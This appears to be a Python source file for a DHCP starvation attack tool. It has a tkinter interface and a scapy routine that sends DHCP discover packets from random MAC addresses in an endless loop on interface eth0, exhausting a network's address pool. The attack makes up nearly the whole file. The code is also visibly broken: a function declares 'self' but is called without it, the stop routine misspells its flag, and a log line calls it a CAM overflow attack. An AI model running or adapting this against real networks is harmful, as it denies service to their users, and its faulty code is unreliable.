# DHCP Starvation Attack

import scapy.all as scapy
from scapy.layers.l2 import Ether, sendp
from scapy.layers.dhcp import IP, UDP, BOOTP, DHCP
import time
import threading
import traceback

from tkinter import *

def startDhcp(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetMac, colorConfig = "#252525") :
    global dhcpIsRunning, dhcpThreads, terminalLabel, wiresharkLabel, errorOutputLabel

    scapy.conf.checkIPaddr = False
    dhcpIsRunning = False
    dhcpThreads = threading.Thread(target = lambda : sendDhcpPacket(targetMac))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    wiresharkLabel.configure(bg = colorConfig)
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Target MAC = " + targetMac + "\n"
    terminalLabel["text"] += "$ Running CAM Overflow Attack...\n"

    print("\nTarget MAC = " + targetMac + "\n")

    runDhcpAttack(targetMac)

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopDhcp() :
    global dhcpThreads, dhcpIsRunning

    try:
        terminalLabel["text"] += "$ Stopping DHCP Table Attack...\n"
        dhcpIsrunning = False
        dhcpThreads.join(0)
        dhcpThreads = None
        terminalLabel["text"] += "$ DHCP Table Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def runDhcpAttack(targetMac) :
    global dhcpThreads, dhcpIsRunning

    dhcpIsRunning = True
    dhcpThreads.start()

def craft_dhcp_discover_packet(self):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff", src=scapy.RandMAC(), type=0x0800) \
            / IP(src="0.0.0.0", dst="255.255.255.255") \
            / UDP(sport=68, dport=67) \
            / BOOTP(chaddr=scapy.RandMAC(), op=1) \
            / DHCP(options=[("message-type", "discover"), "end"])
    return packet

def sendDhcpPacket(targetMac):
    sendp(craft_dhcp_discover_packet(), iface='eth0', loop=1, verbose =1)
    